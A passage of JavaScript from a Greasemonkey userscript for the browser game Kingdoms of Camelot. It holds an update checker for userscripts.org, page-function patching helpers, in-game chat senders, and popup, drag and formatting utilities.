        container_div.style.left='0px';
        container_div.style.width='100%';
        container_div.style.height='1px';
        container_div.style.overflow='visible';
        container_div.style.zIndex=10000000;
        
        div=document.createElement('div');
        div.id='modal_js_confirm_contents';
        div.style.zIndex=10000000;
        div.style.backgroundColor='#eee';
        div.style.fontFamily='"lucida grande",tahoma,verdana,arial,sans-serif';
        div.style.fontSize='11px';
        div.style.textAlign='center';
        div.style.color='#333333';
        div.style.border='2px outset #666';
        div.style.padding='10px';
        div.style.position='relative';
        div.style.width='300px';
        div.style.height='100px';
        div.style.margin='300px auto 0px auto';
        div.style.display='block';
        
        container_div.appendChild(div);
        document.body.appendChild(container_div);
        
        div.innerHTML = '<div style="text-align:center"><div>'+confirm_msg+'</div><br/><div>Press OK to continue.</div><br><button id="modal_js_confirm_ok_button">OK</button> <button id="modal_js_confirm_cancel_button">Cancel</button></div>';
        var ok_button = document.getElementById('modal_js_confirm_ok_button');
        ok_button.addEventListener('click',function() {
            if(ok_function && typeof(ok_function) == "function"){
                ok_function();
            }
            container_div.parentNode.removeChild(container_div);
        },false);
        var cancel_button = document.getElementById('modal_js_confirm_cancel_button');
        cancel_button.addEventListener('click',function() {
            if(cancel_function && typeof(cancel_function) == "function"){
                cancel_function();
            }
            container_div.parentNode.removeChild(container_div);
        },false);
    }
}

// The following code is released under public domain.

var AutoUpdater_158505 = {
    id: 158505,
    days: 1,
    name: "Zakra Robot Alliance",
    version: Version,
    beta: GlobalOptions.pbupdatebeta,
    betaUrl : 'http://userscripts.org/scripts/show/158505',
    time: new Date().getTime(),
    call: function(response, secure) {
        GM_xmlhttpRequest({
            method: 'GET',
        url: this.beta ? this.betaUrl : 'http'+(secure ? 's' : '')+'://userscripts.org/scripts/source/'+this.id+'.meta.js',
        onload: function(xpr) {AutoUpdater_158505.compare(xpr, response);},
            onerror: function(xpr) {if (secure) AutoUpdater_158505.call(response, false);}
        });
    },
    enable: function() {
        GM_registerMenuCommand("Enable "+this.name+" updates", function() {
            GM_setValue('updated_158505', new Date().getTime()+'');
            AutoUpdater_158505.call(true, true)
        });
    },
    compareVersion: function(r_version, l_version) {
        var r_parts = r_version.split(''),
            l_parts = l_version.split(''),
            r_len = r_parts.length,
            l_len = l_parts.length,
            r = l = 0;
        for(var i = 0, len = (r_len > l_len ? r_len : l_len); i < len && r == l; ++i) {
            r = +(r_parts[i] || '0');
            l = +(l_parts[i] || '0');
        }
        return (r !== l) ? r > l : false;
    },
    compare: function(xpr,response) {
        this.xversion=/\/\/\s*@version\s+(.+)\s*\n/i.exec(xpr.responseText);
        this.xname=/\/\/\s*@name\s+(.+)\s*\n/i.exec(xpr.responseText);
        if ( (this.xversion) && (this.xname[1] == this.name) ) {
            this.xversion = this.xversion[1];
            this.xname = this.xname[1];
        } else {
            if ( (xpr.responseText.match("the page you requested doesn't exist")) || (this.xname[1] != this.name) ) {
                //GM_setValue('updated_158505', 'off');
            }
            return false;
        }
        var updated = this.compareVersion(this.xversion, this.version);
        
        if ( updated ) {
                         
            display_confirm('A new version of '+this.xname+' is available.\nDo you wish to install the latest version?',
                // Ok
                function(){
                    try {
                        location.href = AutoUpdater_158505.beta ? AutoUpdater_158505.betaUrl :  'http://userscripts.org/scripts/source/158505.user.js';
                    } catch(e) {}
                },
                // Cancel
                function(){
                    if ( AutoUpdater_158505.xversion ) {
                        if(confirm('Do you want to turn off auto updating for this script?')) {
                            //GM_setValue('updated_158505', 'off');
                            GlobalOptions.pbupdate = false;
                            GM_setValue ('Options_??', JSON2.stringify(GlobalOptions));
                            AutoUpdater_158505.enable();
                            alert('Automatic updates can be re-enabled for this script in the Options tab.');
                        }
                    }
                }
            );
                                      
        } else if (response){
            alert('No updates available for '+this.name);
        }
    },
    check: function(tf) {
        if (!tf){
            this.enable();
        } else {
            GM_registerMenuCommand("Check "+this.name+" for updates", function() {
                GM_setValue('updated_158505', new Date().getTime()+'');
                AutoUpdater_158505.call(true, true)
            });
            if (+this.time > (+GM_getValue('updated_158505', 0) + 1000*60*60*24*this.days)) {
                GM_setValue('updated_158505', this.time+'');
                this.call(false, true);
            }
        }
    }
};
if (typeof(GM_xmlhttpRequest) !== 'undefined' && typeof(GM_updatingEnabled) === 'undefined') { // has an updater?
    try {
        AutoUpdater_158505.check(GlobalOptions.pbupdate);
    } catch(e) {
        AutoUpdater_158505.check(GlobalOptions.pbupdate);
    }
}
/********* End updater code *************/

/**********************************************************************************/
var CalterUwFunc = function (funcName, findReplace) {
  var t = this;
  this.isEnabled = false;
  this.isAvailable = isAvailable;
  this.setEnable = setEnable;
  this.funcName = funcName;
  this.funcOld = unsafeWindow[funcName];  
  this.funcNew = null;
  try {
    var funcText = unsafeWindow[funcName].toString();
    var rt = funcText.replace ('function '+ funcName, 'function');
    for (var i=0; i<findReplace.length; i++){
      x = rt.replace(findReplace[i][0], findReplace[i][1]);
      if (x == rt)
        return false;
      rt = x;
    }
    this.funcNew = rt;
  } catch (err) {
  }
      
  function setEnable (tf){
    if (t.funcNew == null)
      return;
    if (t.isEnabled != tf){
      if (tf){
          var scr=document.createElement('script');
          scr.innerHTML = funcName +' = '+ t.funcNew;
          document.body.appendChild(scr);
        setTimeout ( function (){document.body.removeChild(scr);}, 0);
          t.isEnabled = true;
      } else {
        unsafeWindow[t.funcName] = t.funcOld;
        t.isEnabled = false;
      }
    }
  }
  function isAvailable (){
    if (t.funcNew == null)
      return false;
    return true;
  }
};

var CalterUwVar = function (funcName, findReplace) {
  var t = this;
  this.isEnabled = false;
  this.isAvailable = isAvailable;
  this.setEnable = setEnable;
  this.funcName = funcName;
  this.funcOld = unsafeWindow[funcName];  
  this.funcNew = null;
  try {
    var funcText = null;
    funcName = funcName.split('.');
    funcText = unsafeWindow[funcName[0]];
    for(var i=1; i<funcName.length; i++)
        funcText = funcText[funcName[i]];

    var rt = funcText.toString();
    for (var i=0; i<findReplace.length; i++){
      x = rt.replace(findReplace[i][0], findReplace[i][1]);
      if (x == rt)
        return false;
      rt = x;
    }
    this.funcNew = rt;
  } catch (err) {
    GM_log(err);
  }
  
  function setEnable (tf){
    if (t.funcNew == null)
      return;
    if (t.isEnabled != tf){
      if (tf){
          var scr=document.createElement('script');
          scr.innerHTML = funcName +' = '+ t.funcNew;
          document.body.appendChild(scr);
        setTimeout ( function (){document.body.removeChild(scr);}, 0);
          t.isEnabled = true;
      } else {
        unsafeWindow[t.funcName] = t.funcOld;
        t.isEnabled = false;
      }
    }
  }
  function isAvailable (){
    if (t.funcNew == null)
      return false;
    return true;
  }
};

function getMarchInfo (cityID){
  var ret = {};

  ret.marchUnits = [];
  ret.returnUnits = [];
  ret.resources = [];
  for (i=0; i<13; i++){
    ret.marchUnits[i] = 0;
    ret.returnUnits[i] = 0;
  }
  for (i=0; i<5; i++){
    ret.resources[i] = 0;
  }
  
  for (k in Seed.queue_atkp[cityID]){   // each march
      march = Seed.queue_atkp[cityID][k];
      if(march.marchType != 5){
          if (typeof (march) == 'object'){
            for (ii=0; ii<13; ii++){
              ret.marchUnits[ii] += parseInt (march['unit'+ ii +'Count']);
              ret.returnUnits[ii] += parseInt (march['unit'+ ii +'Return']);
            }
            for (ii=1; ii<5; ii++){
              ret.resources[ii] += parseInt (march['resource'+ ii]);
            }
              ret.resources[0] += parseInt (march['gold']);
          }
      }
    }
  return ret;
}

function makeButton20 (label){
  var a = document.createElement('a');
  a.className = "button20 ptButton20";
  var s = document.createElement('span');
  s.innerHTML = label;
  a.appendChild (s);
  return a;
}

function strButton20 (label, tags){
  if (tags == null)
    tags = '';
  return ('<TABLE class=ptNoPad><TR><TD><A class="button20 ptButton20" '+ tags +'><SPAN>'+ label +'</span></a></td></tr></table>' );
}

function reloadKOC (){
  var serverId = getServerId();
  if(serverId == '??') window.location.reload(true);
  var goto = window.location.protocol+'//apps.facebook.com/kingdomsofcamelot/?s='+serverId;
  if(document.URL.match(/standalone=1/i)){
    goto = window.location.protocol+'//www.kabam.com/games/kingdoms-of-camelot/play?s='+serverId;
  }
  var t = '<FORM target="_top" action="'+ goto +'" method=post><INPUT id=xxpbButReload type=submit value=RELOAD><INPUT type=hidden name=s value="'+ serverId +'"</form>';
  var e = document.createElement ('div');
  e.innerHTML = t;
  document.body.appendChild (e);
  setTimeout (function (){document.getElementById('xxpbButReload').click();}, 0);
}
  
function htmlSelector (valNameObj, curVal, tags){
  var m = [];
  m.push ('<SELECT');
  if (tags){
    m.push (' ');
    m.push (tags);
  }  
  for (var k in valNameObj){
    m.push ('><OPTION ');
    if (k == curVal)
      m.push ('SELECTED ');
    m.push ('value="');
    m.push (k);
    m.push ('">');
    m.push (valNameObj[k]);
    m.push ('</option>');
  }
  m.push ('</select>');
  return m.join ('');
}

function cityStatusString (cs){
  if (cs==4)
    return 'Vacation';
  if (cs==3)
    return 'Truce';
  if (cs==2)
    return 'Beg Protection';
  return 'Normal';
}    

// Simple method, as if it were typed in thru DOM
function sendChat (msg){
  document.getElementById ("mod_comm_input").value = msg;
  unsafeWindow.Chat.sendChat ();
}

// works well, but message is not echoed back to local client
Chat = {
  params : null,

  sendWhisper : function (msg, who, notify){
    this.params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    this.params.ctype = 3;
    this.params.name = who;
    this._sendit (msg, notify);
  },

  sendGlobal : function (msg, notify){
    this.params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    this.params.ctype = 1;
    this._sendit (msg, notify);
  },

  sendAlliance : function (msg, notify){
    this.params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    this.params.ctype = 2;
    this._sendit (msg, notify);
  },

  _sendit : function (msg, notify){
    function strip(s) {
       return s.replace(/^\s+/, '').replace(/\s+$/, '');
    }
    this.params.comment = strip (msg);
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/sendChat.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: this.params,
      onSuccess: function(transport) {
        if (notify)
          notify ();
      },
      onFailure: function(transport) {
        if (notify)
          notify ();
      }
    });
  },
}



/************  LIB classes/functions .... **************/

DebugTimer = {
  startTime : 0,
  start : function (){
    now = new Date();
    DebugTimer.startTime = now.getTime();
  },
  getMillis : function (){
    now = new Date();
    return now.getTime() - DebugTimer.startTime;
  },
  display : function (label, noReset){
    now = new Date();
    elapsed = now.getTime() - DebugTimer.startTime;
    logit (label +": "+ elapsed/1000);
    if (noReset===null || !noReset)
      DebugTimer.startTime = now.getTime();
  },
};


function debugPos  (e){
  return '['+ e.tagName +'] client - offset: '+ e.clientLeft +','+ e.clientTop +','+ e.clientWidth +','+ e.clientHeight
          +' - '+ e.offsetLeft +','+ e.offsetTop +','+ e.offsetWidth +','+ e.offsetHeight +' '+ e +' --OP--> '+ e.offsetParent;
}

function CwaitForElement (id, timeout, notify){
  this.check = check;
  this.end = new Date().getTime() + timeout;
  var t = this;
  this.check();
  function check(){
    if (document.getElementById (id))
      notify (true);
    else if (new Date().getTime() > t.end)
      notify (false);
    else
      setTimeout (t.check, 500);
  }
}

function clickWin (win,obj,evtName) {
    var evt = win.document.createEvent("MouseEvents");
    evt.initMouseEvent(evtName, true, true, win, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
    return !obj.dispatchEvent(evt);
}
    
function debugElement  (e){
  var x = unsafeWindow.Object.clone (e.wrappedJSObject);
  x.innerHTML = '';
  x.innerText = '';
  x.textContent = '';
  return inspect (x, 1, 1);
}     

function getClientCoords(e){
  if (e==null)
    return {x:null, y:null, width:null, height:null};
  var x=0, y=0;
  ret = {x:0, y:0, width:e.clientWidth, height:e.clientHeight};
  while (e.offsetParent != null){
    ret.x += e.offsetLeft;
    ret.y += e.offsetTop;
    e = e.offsetParent;
  }
  return ret;
}

function DOMtree (e, levels){
  var m = [];
  level (e, levels, 0);
  
  function level (e, levels, cur){
    try {        
      for (var i=0; i<cur; i++)
        m.push('  ');
      if (!e.tagName)
        m.push ('?');
      else
        m.push (e.tagName);
      if (e.id){
        m.push (' id=');
        m.push (e.id);
      }
      if (e.name){
        m.push (' name=');
        m.push (e.name);
      }
      if (e.className){
        m.push (' class=');
        m.push (e.className);
      }
      if (e.style && e.style.display && e.style.display.indexOf('none')>0)
        m.push (' hidden');
       m.push ('\n');
      if (cur < levels){
        for (var c=0; c<e.childNodes.length; c++){
          level (e.childNodes[c], levels, cur+1);
        }
      }
    } catch (e) {
      m.push ('UNAVAILBLE!\n');
    }
  }
  return m.join('');  
}

function parseIntNan (n){
  x = parseInt(n, 10);
  if (isNaN(x))
    return 0;
  return x;
}
function parseIntCommas (n){
  n = n.split(',');
  n = n.join('');
  x = parseInt(n, 10);
  if (isNaN(x))
    return 0;
  return x;
}
function parseIntZero (n){
  n = n.trim();
  if (n == '')
    return 0;
  return parseInt(n, 10);
}
function isNaNCommas (n){
  n = n.split(',');
  n = n.join('');
  return isNaN(n);
}


function getFirefoxVersion (){
  var ver='', i;
  var ua = navigator.userAgent;  
  if (ua==null || (i = ua.indexOf('Firefox/'))<0)
    return;
  return ua.substr(i+8);
}

var WinManager = {
  wins : {},    // prefix : pbPopup obj
  didHide : [],
  
  
  get : function (prefix){
    var t = WinManager;
    return t.wins[prefix];
  },
  
  add : function (prefix, pop){
    var t = WinManager;
    t.wins[prefix] = pop;
    if (unsafeWindow.cpopupWins == null)
      unsafeWindow.cpopupWins = {};
    unsafeWindow.cpopupWins[prefix] = pop;
  },
  
  hideAll : function (){
    var t = WinManager;
    t.didHide = [];
    for (k in t.wins){
      if (t.wins[k].isShown()){
        t.didHide.push (t.wins[k]);
        t.wins[k].show (false);
      }
    }
  },
  restoreAll : function (){
    var t = WinManager;
    for (var i=0; i<t.didHide.length; i++)
      t.didHide[i].show (true);
  },
  
  delete : function (prefix){
    var t = WinManager;
    delete t.wins[prefix];
    delete unsafeWindow.cpopupWins[prefix];
  }    
}


// creates a 'popup' div
// prefix must be a unique (short) name for the popup window
function pbPopup (prefix, x, y, width, height, enableDrag, onClose) {
  var pop = WinManager.get(prefix);
  if (pop){
    pop.show (false);
    return pop;
  }
  this.BASE_ZINDEX = 111111;
    
  // protos ...
  this.show = show;
  this.toggleHide = toggleHide;
  this.getTopDiv = getTopDiv;
  this.getMainTopDiv = getMainTopDiv;
  this.getMainDiv = getMainDiv;
  this.getLayer = getLayer;
  this.setLayer = setLayer;
  this.setEnableDrag = setEnableDrag;
  this.getLocation = getLocation;
  this.setLocation = setLocation;
  this.focusMe = focusMe;
  this.isShown = isShown;
  this.unfocusMe = unfocusMe;
  this.centerMe = centerMe;
  this.destroy = destroy;
  this.autoHeight = autoHeight;

  // object vars ...
  this.div = document.createElement('div');
  this.prefix = prefix;
  this.onClose = onClose;
  
  var t = this;
  this.div.className = 'pbPopup '+ prefix +'_pbPopup';
  this.div.id = prefix +'_outer';
  this.div.style.background = "#fff";
  this.div.style.zIndex = this.BASE_ZINDEX        // KOC modal is 100210 ?
  this.div.style.display = 'none';
  this.div.style.width = width + 'px';
  this.div.style.height = height + 'px';
  this.div.style.maxHeight = height + 'px';
  this.div.style.overflowY = 'show';
  this.div.style.position = "absolute";
  this.div.style.top = y +'px';
  this.div.style.left = x + 'px';
  
  if (pbPopUpTopClass==null)
    topClass = 'pbPopupTop '+ prefix +'_pbPopupTop';
  else
    topClass = pbPopUpTopClass +' '+ prefix +'_'+ pbPopUpTopClass;
    
  var m = '<TABLE cellspacing=0 width=100% ><TR id="'+ prefix +'_bar" class="'+ topClass +'"><TD width=99% valign=bottom><SPAN id="'+ prefix +'_top"></span></td>\
      <TD id='+ prefix +'_X align=right valign=middle onmouseover="this.style.cursor=\'pointer\'" style="color:#fff; background:#333; font-weight:bold; font-size:14px; padding:0px 5px; -moz-border-radius-topright: 20px;">x</td></tr>\
      </table><TABLE cellspacing=0 width=100% ><TR><TD height=100% valign=top class="pbPopMain '+ prefix +'_pbPopMain" colspan=2 id="'+ prefix +'_main"></td></tr></table>';
  document.body.appendChild(this.div);
  this.div.innerHTML = m;
  document.getElementById(prefix+'_X').addEventListener ('click', e_XClose, false);
  this.dragger = new CWinDrag (document.getElementById(prefix+'_bar'), this.div, enableDrag);
  
  this.div.addEventListener ('mousedown', e_divClicked, false);
  WinManager.add(prefix, this);
  
  function e_divClicked (){
    t.focusMe();
  }  
  function e_XClose (){
    t.show(false);
    if (t.onClose != null)
      t.onClose();
  }
  function autoHeight (onoff){
    if (onoff)
      t.div.style.height = '';  
    else
      t.div.style.height = t.div.style.maxHeight;
  }
  function focusMe (){
    t.setLayer(5);
    for (k in unsafeWindow.cpopupWins){
      if (k != t.prefix)
        unsafeWindow.cpopupWins[k].unfocusMe();
    }
  }
  function unfocusMe (){
    t.setLayer(-5);
  }
  function getLocation (){
    return {x: parseInt(this.div.style.left), y: parseInt(this.div.style.top)};
  }
  function setLocation (loc){
    t.div.style.left = loc.x +'px';
    t.div.style.top = loc.y +'px';
  }
  function destroy (){
    document.body.removeChild(t.div);
    WinManager.delete (t.prefix);
  }
  function centerMe (parent){
    if (parent == null){
      var coords = getClientCoords(document.body);
    } else
      var coords = getClientCoords(parent);
    var x = ((coords.width - parseInt(t.div.style.width)) / 2) + coords.x;
    var y = ((coords.height - parseInt(t.div.style.height)) / 2) + coords.y;
    if (x<0)
      x = 0;
    if (y<0)
      y = 0;
    t.div.style.left = x +'px';
    t.div.style.top = y +'px';
  }
  function setEnableDrag (tf){
    t.dragger.setEnable(tf);
  }
  function setLayer(zi){
    t.div.style.zIndex = ''+ (this.BASE_ZINDEX + zi);
  }
  function getLayer(){
    return parseInt(t.div.style.zIndex) - this.BASE_ZINDEX;
  }
  function getTopDiv(){
    return document.getElementById(this.prefix+'_top');
  }
  function getMainDiv(){
    return document.getElementById(this.prefix+'_main');
  }
  function getMainTopDiv(){
      return document.getElementById(this.prefix+'_top');
  }
  function isShown (){
    return t.div.style.display == 'block';
  }
  function show(tf){
    if (tf){
      t.div.style.display = 'block';
      t.focusMe ();
    } else {
      t.div.style.display = 'none';
    }
    return tf;
  }
  function toggleHide(t){
    if (t.div.style.display == 'block') {
      return t.show (false);
    } else {
      return t.show (true);
    }
  }
}

function CWinDrag (clickableElement, movingDiv, enabled) {
  var t=this;
  this.setEnable = setEnable;
  this.setBoundRect = setBoundRect;
  this.debug = debug;
  this.dispEvent = dispEvent;
  this.lastX = null;
  this.lastY = null;
  this.enabled = true;
  this.moving = false;
  this.theDiv = movingDiv;
  this.body = document.body;
  this.ce = clickableElement;
  this.moveHandler = new CeventMove(this).handler;
  this.outHandler = new CeventOut(this).handler;
  this.upHandler = new CeventUp(this).handler;
  this.downHandler = new CeventDown(this).handler;
  this.clickableRect = null;
  this.boundRect = null;
  this.bounds = null;
  this.enabled = false;
  if (enabled == null)
    enabled = true;
  this.setEnable (enabled);

  function setBoundRect (b){    // this rect (client coords) will not go outside of current body
    this.boundRect = boundRect;
    this.bounds = null;
  }

  function setEnable (enable){
    if (enable == t.enabled)
      return;
    if (enable){
      clickableElement.addEventListener('mousedown',  t.downHandler, false);
      t.body.addEventListener('mouseup', t.upHandler, false);
    } else {
      clickableElement.removeEventListener('mousedown', t.downHandler, false);
      t.body.removeEventListener('mouseup', t.upHandler, false);
    }
    t.enabled = enable;
  }

  function CeventDown (that){
    this.handler = handler;
    var t = that;
    function handler (me){
      if (t.bounds == null){
        t.clickableRect = getClientCoords(clickableElement);
        t.bodyRect = getClientCoords(document.body);
        if (t.boundRect == null)
          t.boundRect = t.clickableRect;
        t.bounds = {top:10-t.clickableRect.height, bot:t.bodyRect.height-25, left:40-t.clickableRect.width, right:t.bodyRect.width-25};
      }
      if (me.button==0 && t.enabled){
        t.body.addEventListener('mousemove', t.moveHandler, true);
        t.body.addEventListener('mouseout', t.outHandler, true);
        t.lastX = me.clientX;
        t.lastY = me.clientY;
        t.moving = true;
      }
    }
  }

  function CeventUp  (that){
    this.handler = handler;
    var t = that;
    function handler (me){
      if (me.button==0 && t.moving)
        _doneMoving(t);
    }
  }

  function _doneMoving (t){
    t.body.removeEventListener('mousemove', t.moveHandler, true);
    t.body.removeEventListener('mouseout', t.outHandler, true);
    t.moving = false;
  }

  function CeventOut  (that){
    this.handler = handler;
    var t = that;
    function handler (me){
      if (me.button==0){
        t.moveHandler (me);
      }
    }
  }

  function CeventMove (that){
    this.handler = handler;
    var t = that;
    function handler (me){
      if (t.enabled && !t.wentOut){
        var newTop = parseInt(t.theDiv.style.top) + me.clientY - t.lastY;
        var newLeft = parseInt(t.theDiv.style.left) + me.clientX - t.lastX;
        if (newTop < t.bounds.top){     // if out-of-bounds...
          newTop = t.bounds.top;
          _doneMoving(t);
        } else if (newLeft < t.bounds.left){
          newLeft = t.bounds.left;
          _doneMoving(t);
        } else if (newLeft > t.bounds.right){
          newLeft = t.bounds.right;
          _doneMoving(t);
        } else if (newTop > t.bounds.bot){
          newTop = t.bounds.bot;
          _doneMoving(t);
        }
        t.theDiv.style.top = newTop + 'px';
        t.theDiv.style.left = newLeft + 'px';
        t.lastX = me.clientX;
        t.lastY = me.clientY;
      }
    }
  }

  function debug  (msg, e){
    logit ("*************** "+ msg +" ****************");
    logit ('clientWidth, Height: '+ e.clientWidth +','+ e.clientHeight);
    logit ('offsetLeft, Top, Width, Height (parent): '+ e.offsetLeft +','+ e.offsetTop +','+ e.offsetWidth +','+ e.offsetHeight +' ('+ e.offsetParent +')');
    logit ('scrollLeft, Top, Width, Height: '+ e.scrollLeft +','+ e.scrollTop +','+ e.scrollWidth +','+ e.scrollHeight);
  }

  function dispEvent (msg, me){
    logit (msg + ' Button:'+ me.button +' Screen:'+ me.screenX +','+ me.screenY +' client:'+  me.clientX +','+ me.clientY +' rTarget: '+ me.relatedTarget);
  }
}

function inspect(obj, maxLevels, level, doFunctions){
  var str = '', type, msg;
  if(level == null)  level = 0;
  if(maxLevels == null) maxLevels = 1;
  if(maxLevels < 1)
      return 'Inspect Error: Levels number must be > 0';
  if(obj == null)
    return 'ERROR: Object is NULL\n';
  var indent = '';
  for (var i=0; i<level; i++)
    indent += '  ';
  for(property in obj) {
    try {
        type =  matTypeof(obj[property]);
        if (doFunctions==true && (type == 'function')){
          str += indent + '(' + type + ') ' + property + "[FUNCTION]\n";
        } else if (type != 'function') {
          str += indent + '(' + type + ') ' + property + ( (obj[property]==null)?(': null'):('')) +' = '+ obj[property] +"\n";
        }
        if((type=='object' || type=='array') && (obj[property] != null) && (level+1 < maxLevels))
          str += inspect(obj[property], maxLevels, level+1, doFunctions);  // recurse
    }
    catch(err) {
      // Is there some properties in obj we can't access? Print it red.
      if(typeof(err) == 'string') msg = err;
      else if(err.message)        msg = err.message;
      else if(err.description)    msg = err.description;
      else                        msg = 'Unknown';
      str += '(Error) ' + property + ': ' + msg +"\n";
    }
  }
  str += "\n";
  return str;
}

Array.prototype.compare = function(testArr) {
    if (this.length != testArr.length) return false;
    for (var i = 0; i < testArr.length; i++) {
        if (this[i].compare) {
            if (!this[i].compare(testArr[i])) return false;
        }
        if (this[i] !== testArr[i]) return false;
    }
    return true;
}
String.prototype.StripQuotes = function() {
    return this.replace(/"/g,'');
}

String.prototype.entityTrans = { '&':'&amp;', '<':'&lt;',  '>':'&gt;',  '\"':'&quot;', '\'':'&#039', '<':'\\u003c', '/':'\\/', '\\':'\\\\', '\"':'\\\"','{':'&#123;','}':'&#125;'};
String.prototype.htmlSpecialChars = function() {
  var ret = this.toString();
  for (k in this.entityTrans)
     ret  = ret.split(k).join(this.entityTrans[k]);
  return ret;
}
String.prototype.htmlSpecialCharsDecode = function() {
  var ret = this.toString();
  for (k in this.entityTrans)
     ret = ret.split(this.entityTrans[k]).join(k);
  return ret;
}
String.prototype.trim = function () {
    return this.replace(/^\s*/, "").replace(/\s*$/, "");
}
String.prototype.escape_space = function(){
    var s = this.split(" ");
    for(var i=0; i<s.length; i++)
        s[i] = escape(s[i]);
    //return s.join(" ");
    return this.replace(/</ig,"&#60;");
}
String.prototype.unescape_space = function(){
    var s = this.split(" ");
    for(var i=0; i<s.length; i++)
        s[i] = unescape(s[i]);
    //return s.join(" ");
    return this;
}

function officerId2String (oid){
  if (oid==null)
    return '';
  else if (oid==3)
    return 'Officer';
  else if (oid==2)
    return 'Vice Chance';
  else if (oid==1)
    return 'Chancellor';
  return '';
}

function getResourceProduction (cityId){
  var ret = [0,0,0,0,0];
  var now = unixTime ();
  
  var wilds = [0, 0, 0, 0, 0];
  var w = Seed.wilderness["city" + cityId];
  for (var k in w){
    var type = parseInt(w[k].tileType);
    if (type==10 || type==11)
      wilds[1] += parseInt(w[k].tileLevel);
    else
      wilds[type/10] += parseInt(w[k].tileLevel);
  }  
  
  knight = 0;       
  var s = Seed.knights["city" + cityId];
  if (s) {
    s = s["knt" + Seed.leaders["city" + cityId].resourcefulnessKnightId];
    if (s){
      var knight = parseInt(s.resourcefulness);
      if (s.resourcefulnessBoostExpireUnixtime > now)
        knight *= 1.25;
    }
  }
  var workerFactor = 1;
  var c = parseInt(Seed.citystats["city" + cityId]["pop"][0]);  // Current  population
  var w = parseInt(Seed.citystats["city" + cityId]["pop"][3]);  // Labor force
  if (w > c)
    workerFactor = c / w;
  
  for (var i=1; i<5; i++){
    var usage = Seed.resources["city" + cityId]["rec" + i];
    var items = 0;
    if (parseInt(Seed.playerEffects["r" + i + "BstExp"]) > now) {
      items = 0.25;
    }
    var tech = Seed.tech["tch" + i];
    ret[i] = parseInt((usage[2] * (1 + tech/10 + knight/100 + items + 0.05 * wilds[i]) * workerFactor + 100));
  }
  return ret;  
}

function objectName (o){
  var s = o.toString();
  return s.substr(7,s.length-8);
}

function matTypeof (v){
  if (typeof (v) == 'object'){
    if (!v)
      return 'null';
//    else if (unsafeWindow.Object.prototype.toString.apply(v) === '[object Array]')
    else if (v.constructor.toString().indexOf("Array")>=0 && typeof(v.splice)=='function')
      return 'array';
    else return 'object';
  }
  return typeof (v);
}

function updatebotbutton(text, id)
{
    var but=document.getElementById(id);
    but.innerHTML = '<span style="color: #ff6">'+text+'</span>';
}
    


function tbodyScroller (tbody, maxHeight){  
  tbody.style.maxHeight = '';
  tbody.style.height = '';
  tbody.style.overflowX = 'hidden';
  if (parseInt(tbody.clientHeight) > maxHeight){
    tbody.style.height = maxHeight + 'px';
    tbody.style.maxHeight = maxHeight + 'px';
    tbody.style.overflowY = 'auto';
  }
}
function getRemainingHeight (e, cont){
  var ec = getClientCoords(e);
  var cc = getClientCoords(cont);
  return cont.clientHeight - (ec.y - cc.y);
}


function addCommasInt(n){
  nStr = parseInt(n) + '';
  var rgx = /(\d+)(\d{3})/;
  while (rgx.test(nStr)) {
    nStr = nStr.replace(rgx, '$1' + ',' + '$2');
  }
  return nStr;
}

function addCommas(nStr){
  nStr += '';
  x = nStr.split('.');
  x1 = x[0];
  x2 = x.length > 1 ? '.' + x[1] : '';
  var rgx = /(\d+)(\d{3})/;
  while (rgx.test(x1)) {
    x1 = x1.replace(rgx, '$1' + ',' + '$2');
  }
  return x1 + x2;
}

function unixTime (){
  return parseInt (new Date().getTime() / 1000) + unsafeWindow.g_timeoff;
}
function htmlOptions (a, curVal){
  m = '';
  for (k in a)
    m += '<OPTION value="'+ k +'"'+ (k==curVal?' SELECTED':'')  +'>'+ a[k] +'</option>';
  return m;
}
function getFunctionName (func){
  var name=/\W*function\s+([\w\$]+)\(/.exec(func);
  if (!name)
    return '';
  return name[1];
}

function findAllBetween (txt, find1, find2){
  var m = [];
  var last = 0;
  while ( (i1=txt.indexOf(find1, last))>=0 && (i2=txt.indexOf (find2, i1))>=0 ) {
    m.push (txt.substring(i1+find1.length, i2));
    last = i2 + find2.length;
  }
  return m;
}

function strUpTo (s, find){
  var i = s.indexOf(find);
  if (i > 0)
    return s.substr(0, i);
  return s;
}

/********
 Xd Xh
 Xh Xm
 Xm Xs
 Xs
********/
function timestrShort(time) {
  time = parseInt (time);
  if (time > 86400){
    var m = [];
    time /= 3600;
    m.push (parseInt(time/24));
    m.push ('d ');
    m.push (parseInt(time%24));
    m.push ('h ');
    return m.join ('');    
  } else
    return timestr (time);
}

/**********************
 part       full
 Xd Xh Xm   Xd Xh Xm Xs
 Xh Xm      Xh Xm Xs
 Xm Xs      Xm Xs
 Xs         Xs
**********************/
function timestr(time, full) {
  time = parseInt (time);
  var m = [];
  var t = time;
  if (t < 61)
    return  t + 's';
  if (t > 86400){
    m.push (parseInt(t/86400));
    m.push ('d ');
    t %= 86400;
  }  
  if (t>3600 || time>3600){
    m.push (parseInt(t/3600));
    m.push ('h ');
    t %= 3600;
  }  
  m.push (parseInt(t/60));
  m.push ('m');
  if (full || time<=3600 ){
    m.push (' ');
    m.push (t%60);
    m.push ('s');  
  }
  return m.join ('');
}

/************  LIB singletons .... **************/
// TODO: fix REopening window
var WINLOG_MAX_ENTRIES = 1000;     // TODO
var WinLog = {
  state : null,
  win: null,
  eOut : null,
  lastE : null,
  enabled : true,
  reverse : true,
  busy : false,
isOpening : false,

  open : function (){
    var t = WinLog;

    function eventButClear(){
      var t = WinLog;
      t.lastE = null;
      t.eOut.innerHTML ='';
    }
    function eventButReverse(){
      var t = WinLog;
      if (t.busy)
        return;
      t.busy = true;
      if (t.reverse){
        t.win.document.getElementById('wlRev').value= 'Top';
        t.reverse = false;
      } else{
        t.win.document.getElementById('wlRev').value= 'Bottom';
        t.reverse = true;
      }
      var n = t.eOut.childNodes.length;
      if (n < 2)
        return;
      for (i=n-2; i>=0; i--){
        t.eOut.appendChild (t.eOut.childNodes[i]);
      }
      t.busy = false;
    }
    
    if (!t.win || t.win.closed){
t.isOpening = true;  
// Firefox bug??? It appears as if a new thread is started on open, withOUT reusing same window? huh?
      t.win = window.open('', 'uwtrace', 'top=30,left=0,width=900,height=700,scrollbars=no,location=no,menubar=no,directories=no,status=no');
t.isOpening = false;
t.state = null;
    }
    
